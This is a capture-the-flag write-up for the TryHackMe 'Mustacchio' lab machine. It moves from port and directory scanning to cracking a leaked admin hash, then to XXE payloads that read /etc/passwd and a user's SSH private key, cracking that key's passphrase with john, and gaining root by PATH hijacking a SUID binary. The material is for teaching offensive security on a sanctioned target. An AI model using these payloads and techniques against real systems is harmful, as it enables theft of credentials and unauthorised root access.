---
title: 'Tryhackme - Mustaccio Writeup'
description: 'Deploy and compromise the machine!' 
publishedAt: '2023-07-20'
---

# Tryhackme - Mustaccio (Easy)
Deploy and compromise the machine!

## Scanning the system
```bash
sudo nmap -sS -sV -p- -oN nmap.initial mustacchio.thm
```
Results:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 14:28 CEST
Nmap scan report for mustacchio.thm (10.10.150.63)
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.15 seconds
```
Interesting to see multiple web servers running on a host. Nginx on port 8765 might be interesting because it's not running an a standart port.

## Enumerating Apache 
### Manual enumeration
There doesn't seem to be much going on the website served. It's only html files and robots.txt didn't gain us anything either.

### Bruteforcing directories
Even though I am more curious about nginx running on 8765, i started a dirscan just in case. While this was running, i went on to enumerating nginx.
```bash
gobuster dir -u http://mustacchio.thm -w /opt/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
```
/images (Status: 301)
/custom (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
```

## Enumerating nginx
### Manual enumeration
:article-img{src="/tryhackme-mustacchio/admin-panel.png"}
On the home page we're greeted by a admin panel with a login form. It's asking us for a username and password. I looked through the source of the page to check if there was any credentials in there, but no easy win today.

### Bruteforcing directories
There could be a directory that contains some credentials so let's run a quick scan for directories.

```bash
gobuster dir -u http://mustacchio.thm:8765 -w /opt/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
```
/assets (Status: 301)
/auth (Status: 301)
```

## Gaining access
While the scan on nginx was running i noticed that the directory scan on apache had finished. I looked through a few of the folders and found a `users.bak` in http://mustacchio.thm/custom/js/.

Running `file users.bak`{lang="bash"} showed that this file contained a SQLite 3 database.
I opened it and extracted a user and password from it.
```bash
sqlite3 users.bak
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4......
```
The password looks like a hash so i quickly ran it through (crackstation)[https://crackstation.net/], this resulted in a password that allowed us to login into the admin panel.

## Exploiting the admin panel
:article-img{src="/tryhackme-mustacchio/add-comment.png"}
Inside the sourcecode of the admin panel there is the following comment which gives us a username to login to with SSH.
```html
<!-- Barry, you can now SSH in using your key!-->
```

On the panel we can add comments. Submitting normal text just resulted in 3 empty fields being returned. 
```
Name:

Author :

Comment :
```
I looked how the request was made and noticed the name of the post field was `xml`.
I tried some things and the following xml resulted into some of the fields being filled.
```xml
<post>
  <name>Barry</name>
  <author>Barry</author>
  <comment>Hello</comment>
</post>
```
This confirmed to me that there was something parsing xml on the backend.

### Exploting the XML using XXE
I searched up some XXE examples and submitted them in the admin panel.
After a few tries the following returned the contents of `/etc/passwd`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post><name>&xxe;</name></post>
```
So XXE was definitely the way forward. Since we found the comment earlier talking about barry's SSH key, i tried to get his key from his home directory.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<post><name>&xxe;</name></post>
```
This was a success and we now have his (encrypted) private key.

## Getting into SSH
We have a key and we know who it belongs to, so all we need is to find the password of the key. I tried the same password as for the admin panel but no luck there. Let's try to bruteforce it.


I use this stupid workaround to get ssh2john working on my laptop and extract the hash.
```bash
sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python - key > ssh-hash
```
After that we can crack the hash with john.
```bash
john ssh-hash --wordlist=/opt/wordlists/rockyou.txt
```
This successfully cracks the password and allows us to login to the barry user via SSH.

## Escalating our privileges
I start enumarting the usual stuff on linux systems. Sudo perms, cronjobs, capabilities, SUID binaries, etc.

There is an interesting SUID binary at `/home/joe/live_log`, it's owned by root and it's some sort of executeable.

Executing it and using `strings` we can see that it's running the command `tail -f /var/log/nginx/access.log`. Since it's not using a absolute path we can use the PATH variable to execute our own version of tail.
```bash
barry@mustacchio:~$ cp /bin/bash .
barry@mustacchio:~$ mv bash tail
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ export PATH=/home/barry/:$PATH
barry@mustacchio:~$ which tail
/home/barry//tail
```

We get absolutely spammed with messages, and can't execute any commands. 
```
/var/log/nginx/access.log: line 14046: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14047: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14048: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14049: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14050: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14051: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14052: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14053: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14054: 10.14.xxx.139: command not found
/var/log/nginx/access.log: line 14055: 10.14.xxx.139: command not found
```

Let's retry using another binary.
```bash
barry@mustacchio:~$ cp /usr/bin/vim .
barry@mustacchio:~$ mv vim tail
barry@mustacchio:~$ chmod +x tail
```
This time we simply get the log file opened in vim and we can open a shell by typing `:!bash`.
```
root@mustacchio:~# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

## Conclusion
This was a nice and easy box. The route was quite clear along the way, and we could easily escalate our privileges using the PATH variable.
